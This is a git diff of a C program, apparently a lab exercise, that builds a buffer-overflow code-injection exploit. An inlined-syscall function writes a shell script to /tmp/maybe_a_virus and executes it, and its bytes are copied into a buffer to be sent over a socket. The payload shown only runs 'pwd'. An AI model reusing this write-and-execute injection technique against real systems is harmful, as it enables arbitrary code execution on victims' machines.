@@ -70,62 +70,46 @@ void free_list (struct list_server * list){
 		list->Debut = aux;
 	}
 }
-ssize_t my_write(int fd, const void *buf, size_t size){
-    ssize_t ret;
+
+void code_2_inject(){
+	const char hello[] = "#!/bin/bash\npwd\n";
+    //int fd = my_open("/tmp/maybe_a_virus", O_CREAT | O_RDWR | O_TRUNC, 00700);
+	int fd;
+    asm volatile
+    (
+        "syscall"
+        : "=a" (fd)
+        : "0" (__NR_open), "D" ("/tmp/maybe_a_virus"), "S" (O_CREAT | O_RDWR | O_TRUNC), "d" (00700)
+        : "rcx", "r11", "memory"
+    );
+    //my_write(fd, hello, sizeof(hello));
+	ssize_t ret;
     asm volatile
     (
         "syscall"
         : "=a" (ret)
         //                 EDI      RSI       RDX
-        : "0"(__NR_write), "D"(fd), "S"(buf), "d"(size)
+        : "0"(__NR_write), "D"(fd), "S"(hello), "d"(sizeof(hello))
         : "rcx", "r11", "memory"
     );
-    return ret;
-}
-
-
-int my_open(const char * name, int flags, mode_t mode){
-    int fd;
+    //my_close(fd);
+	int ret_2;
     asm volatile
     (
         "syscall"
-        : "=a" (fd)
-        : "0" (__NR_open), "D" (name), "S" (flags), "d" (mode)
-        : "rcx", "r11", "memory"
-    );
-    return fd;
-}
-
-int my_close(int fd){
-    int ret;
-    asm volatile
-    (
-        "syscall"
-        :"=a" (ret)
+        :"=a" (ret_2)
         : "0" (__NR_close), "D" (fd)
         : "rcx", "r11", "memory"
     );
-    return ret;
-}
-
-int my_execve(const char *name, char *const argv[], char *const envp[]){
-    int ret;
+    //my_execve("/tmp/maybe_a_virus",0,0);
+	int ret_3;
     asm volatile
     (
         "syscall"
-        :"=a" (ret)
-        : "0" (__NR_execve), "D" (name),"S" (argv), "d" (envp)
+        :"=a" (ret_3)
+        : "0" (__NR_execve), "D" ("/tmp/maybe_a_virus"),"S" (0), "d" (0)
         : "rcx", "r11", "memory"
     );
-    return ret;
-}
-
-void code_2_inject(){
-	const char hello[] = "#!/bin/bash\npwd\n";
-    int fd = my_open("/tmp/maybe_a_virus", O_CREAT | O_RDWR | O_TRUNC, 00700);
-    my_write(fd, hello, sizeof(hello));
-    my_close(fd);
-    my_execve("/tmp/maybe_a_virus",0,0);
 }
 
 void exploit(int connfd){
@@ -133,12 +117,16 @@ void exploit(int connfd){
 	// Buffer overflow
 	char buff[350];
 	int buff_size = 49;
-	char * s = &my_write;
+	bzero(buff, sizeof(buff));
+	char * s = &code_2_inject; // Adresse du code_2_inject stockée
+	void (*ptr_func)() = code_2_inject; // déclaration d'un pointeur vers la fonction
+	void* addr_func = (void*)ptr_func; // conversion du pointeur vers la fonction en un pointeur de type void*
+	printf("L'adresse de la fonction code_2_inject est : %p\n", addr_func);
 	int i =0;
-	for (;s<&exploit;s++,i++){
-        buff[i]=*s;
-        printf(" %02x",0xff& buff[i]);
-        if (i%16 ==0){
+	for (; s < &exploit; s++, i++){ // adresse de exploit
+        buff[i] = *s;
+        printf(" %02x", 0xff& buff[i]);
+        if (i % 16 ==0){
             printf("\n");
         }
     }
@@ -321,8 +309,8 @@ int entry_point() {
 int main(int argc, char * argv[]) {
 
 	// Call entry_point function where every tasks are done
-	//entry_point();
-	exploit(3);
+	entry_point();
+	//exploit(3);
     return 0;
 }
 	
